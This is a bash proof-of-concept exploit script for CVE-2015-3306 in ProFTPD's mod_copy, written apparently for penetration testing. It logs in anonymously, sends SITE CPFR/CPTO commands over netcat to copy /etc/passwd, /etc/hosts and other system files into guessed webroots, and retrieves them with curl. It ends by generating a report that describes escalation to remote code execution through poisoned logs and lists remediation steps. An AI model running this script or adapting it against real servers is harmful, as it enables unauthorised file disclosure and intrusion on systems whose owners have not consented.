#!/usr/bin/env bash
# proftpd_modcopy_poc.sh — CVE-2015-3306 PoC (no Metasploit, no RCE assumption)
# Proves arbitrary file copy via ProFTPD mod_copy by copying readable files to webroot.
# Usage: ./proftpd_modcopy_poc.sh <TARGET_IP>
# Artifacts: ./proftpd_poc_<ts>_<ip>/

set -euo pipefail
die(){ echo "[!] $*" >&2; exit 1; }

TGT="${1:-}"; [[ -n "$TGT" ]] || die "Usage: $0 <TARGET_IP>"
command -v nc >/dev/null 2>&1 || die "Missing tool: nc"
command -v curl >/dev/null 2>&1 || die "Missing tool: curl"

TS="$(date +%Y%m%d-%H%M%S)"
ROOT="proftpd_poc_${TS}_${TGT}"
mkdir -p "$ROOT"
FTP_OUT="$ROOT/ftp_dialog.txt"
REPORT="$ROOT/REPORT.md"

echo "[*] ProFTPD mod_copy PoC against $TGT"
echo "[*] Evidence/log -> $FTP_OUT"

# Try common webroots
WEBROOT=""
for W in /var/www/html /var/www /srv/www/htdocs /usr/local/apache2/htdocs; do
  # quick write test: copy /etc/passwd → ${W}/passwd
  {
    echo "USER anonymous"
    echo "PASS anonymous"
    echo "SITE CPFR /etc/passwd"
    echo "SITE CPTO ${W}/passwd"
    echo "QUIT"
  } | nc -nv "$TGT" 21 >> "$FTP_OUT" 2>&1 || true

  if curl -m 3 -s "http://${TGT}/passwd" | head -n1 | grep -q '^root:x:'; then
    WEBROOT="$W"
    echo "    [+] Read/Write confirmed at ${WEBROOT} (http://${TGT}/passwd)"
    break
  fi
done

if [[ -z "$WEBROOT" ]]; then
  echo "[!] Could not confirm R/W to a known webroot (still vulnerable if CPFR/CPTO succeed)."
  # Still write the FTP dialog and a short report.
else
  # Collect a few **readable** files as evidence (no special perms needed)
  declare -a FILES=(
    "/etc/passwd"
    "/etc/issue"
    "/etc/hosts"
    "/var/lib/dpkg/status"   # package list (Ubuntu/Debian) - often world readable
  )

  for SRC in "${FILES[@]}"; do
    BASENAME="$(basename "$SRC")"
    {
      echo "USER anonymous"
      echo "PASS anonymous"
      echo "SITE CPFR ${SRC}"
      echo "SITE CPTO ${WEBROOT}/${BASENAME}.poc"
      echo "QUIT"
    } | nc -nv "$TGT" 21 >> "$FTP_OUT" 2>&1 || true

    # Try to fetch it over HTTP if in webroot
    curl -m 3 -s "http://${TGT}/${BASENAME}.poc" > "$ROOT/${BASENAME}.poc" 2>/dev/null || true
  done
fi

# Quick summary report
{
  echo "# ProFTPD mod_copy PoC — $TGT"
  echo
  echo "Timestamp: $(date -u +"%Y-%m-%d %H:%M:%SZ")"
  echo
  echo "## Findings"
  if grep -q '250 Copy successful' "$FTP_OUT"; then
    echo "- **Vulnerable to CVE-2015-3306 (mod_copy)** — server accepted \`SITE CPFR/CPTO\` and performed file copy."
  else
    echo "- Server **did not** show a successful copy in this run. Review FTP dialog."
  fi
  echo
  echo "### Evidence"
  if [[ -n "$WEBROOT" ]]; then
    echo "- Read/Write confirmed at \`$WEBROOT\` (retrieved \`/etc/passwd\`)."
    [[ -s "$ROOT/passwd.poc" ]] && echo "  - Saved: \`$ROOT/passwd.poc\` (first line starts with \`root:x:\`)."
  else
    echo "- Could not fetch from webroot (may still be vulnerable; see FTP dialog)."
  fi
  echo
  echo "### Why log-poisoning failed"
  echo "- Apache access logs on Ubuntu are typically \`640 root:adm\` → **not world-readable**, so ProFTPD couldn't read them:"
  echo "  - FTP replies showed \`550 ...access.log: Permission denied\`."
  echo
  echo "## Impact"
  echo "- Attacker can copy **any world-readable file** to a web-accessible location (data disclosure)."
  echo "- With a readable attacker-controlled source (e.g., writable logs), this can escalate to **RCE** by copying a poisoned log to webroot."
  echo
  echo "## Remediation"
  echo "- Disable/remove \`mod_copy\` or restrict \`SITE CPFR/CPTO\` to authenticated users only."
  echo "- Update/replace ProFTPD 1.3.5; apply vendor patches."
  echo "- Harden file permissions (logs should not be readable by the ProFTPD process)."
  echo
  echo "## Artifacts"
  echo "- FTP dialog: \`$FTP_OUT\`"
  [[ -s "$ROOT/passwd.poc" ]] && echo "- Copied /etc/passwd: \`$ROOT/passwd.poc\`"
  [[ -s "$ROOT/issue.poc"  ]] && echo "- Copied /etc/issue: \`$ROOT/issue.poc\`"
  [[ -s "$ROOT/hosts.poc"  ]] && echo "- Copied /etc/hosts: \`$ROOT/hosts.poc\`"
  [[ -s "$ROOT/status.poc" ]] && echo "- Copied package inventory (/var/lib/dpkg/status): \`$ROOT/status.poc\`"
} > "$REPORT"

echo
echo "==== DONE ===="
echo "• FTP dialog/logs : $FTP_OUT"
echo "• Report          : $REPORT"
[[ -n "$WEBROOT" ]] && echo "• Fetchable PoCs  : http://${TGT}/passwd , /issue.poc , /hosts.poc , /status.poc"
